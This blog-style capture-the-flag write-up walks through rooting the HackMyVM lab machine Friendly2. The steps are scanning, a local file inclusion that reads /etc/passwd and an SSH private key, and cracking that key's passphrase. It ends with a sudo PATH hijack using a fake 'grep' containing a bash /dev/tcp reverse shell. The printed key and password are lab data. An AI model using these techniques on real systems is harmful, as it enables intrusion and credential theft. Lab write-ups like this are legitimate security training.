---
title: Write-up Friendly2 on HackMyVM
author: eMVee
date: 2024-01-28 10:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, PNPT, LFI, SSH, Path hijack]
render_with_liquid: false
---

Friendly 2 the sequel to Friendly. Although it is a series for beginners, after hacking the first machine in this serie, I decided to hack the next machine. Who knows if there is any neath surprise in the machine.

## Getting started
As usual we should create a project directory before we start.

```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/VPN/HTB

┌──(emvee㉿kali)-[~/Documents/VPN/HTB]
└─$ mkdir Friendly2

┌──(emvee㉿kali)-[~/Documents/VPN/HTB]
└─$ cd Friendly2        
```
Next we should identify the IP adress of our target.
```bash
┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ fping -ag 10.0.2.0/24 2> /dev/null                                         
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.44
```
Since we know the IP address of the target we should assign it to a variable. This will make our life easier.
```bash
┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ ip=10.0.2.44  
```
## Enumeration
We should scan for open ports and services hosted on them with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-28 20:00 CET
Nmap scan report for 10.0.2.44
Host is up (0.00072s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 74:fd:f1:a7:47:5b:ad:8e:8a:31:02:fe:44:28:9f:d2 (RSA)
|   256 16:f0:de:51:09:ff:fc:08:a2:9a:69:a0:ad:42:a0:48 (ECDSA)
|_  256 65:0e:ed:44:e2:3e:f0:e7:60:0c:75:93:63:95:20:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Servicio de Mantenimiento de Ordenadores
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 08:00:27:0C:8F:A4 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.72 ms 10.0.2.44

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds

```
Nmap discovered two open ports and some information about the services. Let's add the following items to our notes:
- Linux, probably a Debian
- Port 22
    - SSH
    - OpenSSH 8.4p1 Debian
- Port 80
    - HTTP
    - Apache 2.4.56
    - Title: Servicio de Mantenimiento de Ordenadores


Based on this information we sould check first the webservice with whatweb. Perhaps we discover some information we could use.

```bash
┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ whatweb http://$ip                                                                                                              
http://10.0.2.44 [200 OK] Apache[2.4.56], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.0.2.44], Title[Servicio de Mantenimiento de Ordenadores]
```
Nothing new yet. Let's check with nikto.

```bash
┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ nikto -h $ip 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.44
+ Target Hostname:    10.0.2.44
+ Target Port:        80
+ Start Time:         2024-01-28 20:02:52 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.56 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: a8a, size: 5fa570aaa96df, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
+ /tools/: This might be interesting.
+ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2024-01-28 20:03:31 (GMT1) (39 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Let's keep the directory name in our mind and check the website dirst.

![image](/assets/img/WriteUp/HackMyVM/Friendly2/Pasted image 20240128200507.png){: width="700" height="400" }

We discovered a directory with nikto earlier. We should check the directory in the browser. Perhaps there is something useful here.


![image](/assets/img/WriteUp/HackMyVM/Friendly2/Pasted image 20240128200548.png){: width="700" height="400" }


Well, this is Spanish and since I don't speak it I had to translate it to see if there is any interesting mentioned here. Let's check the source code as well, we can do this in the browser by hitting the key combination `CTRL` + `U`.

![image](/assets/img/WriteUp/HackMyVM/Friendly2/Pasted image 20240128201553.png){: width="700" height="400" }

There is a comment about a file that checks if a file exists. This could be useful to launch a Local File Inclusion (LFI) attack. We have to check if the file exists and if the default value will work.
![image](/assets/img/WriteUp/HackMyVM/Friendly2/Pasted image 20240128201624.png){: width="700" height="400" }

Let's check for the `/etc/passwd` file. This gives us an idea what users are there on the system.

![image](/assets/img/WriteUp/HackMyVM/Friendly2/Pasted image 20240128201652.png){: width="700" height="400" }

We are able to read the file. But it is not the neat to read, we can do the same trick as before, hitting the key combination `CTRL` + `U` to see the source code of the page.
This will make the file `/etc/passwd` readable.

![image](/assets/img/WriteUp/HackMyVM/Friendly2/Pasted image 20240128201713.png){: width="700" height="400" }

We have identified the user `gh0st`, let's check if this user has the `id_rsa` file available so we can capture it an try to get our way into the machine via the SSH service.

![image](/assets/img/WriteUp/HackMyVM/Friendly2/Pasted image 20240128201758.png){: width="700" height="400" }

Now we should copy the content and paste it into a file on our attacker machine.
```bash
┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ nano id_rsa 

┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ cat id_rsa  
-----BEGIN OPENSSH PRIVATE KEY-----
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
9tDhjVw3oagRmc3R03zfIwbPINo=
-----END OPENSSH PRIVATE KEY-----

```
As soon as the file has been saved we have to set the correct permission, otherwise we cannot use it.
```bash
┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ chmod 600 id_rsa
```
We should try to crack the file with John The Ripprt to get a password.

```bash
┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ ssh2john id_rsa > ssh.john

┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.john  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
celtic           (id_rsa)     
1g 0:00:00:07 DONE (2024-01-28 20:22) 0.1379g/s 35.31p/s 35.31c/s 35.31C/s tiffany..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
We succeeded and have now a password. We are ready to rumble.

## Initial access
With the username, the SSH key and the password we can try to connect to the SSH service.
```bash
┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ ssh gh0st@$ip -i id_rsa   
The authenticity of host '10.0.2.44 (10.0.2.44)' can't be established.
ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.44' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st@friendly2:~$ 

```
We are lucky and now we have to capture the user flag.
```bash
gh0st@friendly2:~$ whoami
gh0st
gh0st@friendly2:~$ hostname
friendly2
gh0st@friendly2:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:0c:8f:a4 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.44/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 468sec preferred_lft 468sec
    inet6 fe80::a00:27ff:fe0c:8fa4/64 scope link 
       valid_lft forever preferred_lft forever
gh0st@friendly2:~$ ls
user.txt
gh0st@friendly2:~$ cat user.txt
HERE IS THE USER FLAG
```
One of the first things we should do is checking our permissions.
```bash
gh0st@friendly2:~$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
gh0st@friendly2:~$ 
```
It looks like we can use the sudo command on a bash file and we can even set the environment path. This will help us with a path hijack probably.
Let's check the bash script.

```bash
gh0st@friendly2:~$ ls -la /opt/security.sh
-rwxr-xr-x 1 root root 561 Apr 29  2023 /opt/security.sh
gh0st@friendly2:~$ cat /opt/security.sh
#!/bin/bash

echo "Enter the string to encode:"
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ){: width="700" height="400" }
; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"

```
The bash script uses grep. We can create our own grep file that executes our commands.
This gives us the ability to launch a reverse shell as root for example.
We can create the bash file with a reverse shell in the file named `grep`.

```bash
gh0st@friendly2:~$ cd /tmp
gh0st@friendly2:/tmp$ nano grep
gh0st@friendly2:/tmp$ cat grep
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.0.2.15/4321 0>&1
gh0st@friendly2:/tmp$ chmod +x grep
```
Since everything is almost set we have to laucnh our listener.
```bash
┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ rlwrap nc -lvp 4321
listening on [any] 4321 ...
```

## Privilege escalation
No we are ready to start the privilege escalation attack. We have to run the sudo command, set our environment path and run the bash script.

```bash
gh0st@friendly2:~$ sudo PATH=/tmp/:$PATH /opt/security.sh
Enter the string to encode:
abc def


```
Let's check the netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/VPN/HTB/Friendly2]
└─$ rlwrap nc -lvp 4321
listening on [any] 4321 ...
10.0.2.44: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.44] 36018
root@friendly2:/home/gh0st# 


```
We got a shell as root, now let's capture te root flag.
```bash
root@friendly2:/home/gh0st# whoami;hostname;ip a
whoami;hostname;ip a
root
friendly2
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:0c:8f:a4 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.44/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 426sec preferred_lft 426sec
    inet6 fe80::a00:27ff:fe0c:8fa4/64 scope link 
       valid_lft forever preferred_lft forever
root@friendly2:/home/gh0st# cat /root/root.txt
cat /root/root.txt
Not yet! Try to find root.txt.


Hint: ...
root@friendly2:/home/gh0st# 

```
A little surprise! The root flag is somewhere else. Let's use the hint to find it and capture the root flag.

```bash
root@friendly2:~# find / -name "..." 2>/dev/null
find / -name "..." 2>/dev/null
/...
root@friendly2:~# cd /...
cd /...
root@friendly2:/...# ls
ls
ebbg.txt
root@friendly2:/...# cat ebbg.txt
cat ebbg.txt
It's codified, look the cipher:

98199n723q0s44s6rs39r33685q8pnoq



Hint: numbers are not codified
root@friendly2:/...# 

```
Another little surprise. We can use the bash script found earlier with a little adjustment.
In the reverse shell we cannot work very well with nano. We can change the root password and switch user from the user gh0st.
```bash
root@friendly2:/...# passwd 
passwd 
New password: Password
Retype new password: Password
passwd: password updated successfully
root@friendly2:/...# 

```
Now we can switch to the root user from our user gh0st.
```bash
gh0st@friendly2:~$ su root
Password: 
```
We should change the bash script a bit (20 should be extended to 200 for example) and then we are able to capture the root flag.
```bash
root@friendly2:/home/gh0st# nano /opt/security.sh
root@friendly2:/home/gh0st# cat /opt/security.sh
#!/bin/bash

echo "Enter the string to encode:"
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 200 ){: width="700" height="400" }
; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"
root@friendly2:/home/gh0st# bash /opt/security.sh
Enter the string to encode:
98199n723q0s44s6rs39r33685q8pnoq
Original string: 98199n723q0s44s6rs39r33685q8pnoq
Encoded string: THIS IS THE ROOT FLAG
root@friendly2:/home/gh0st# 


```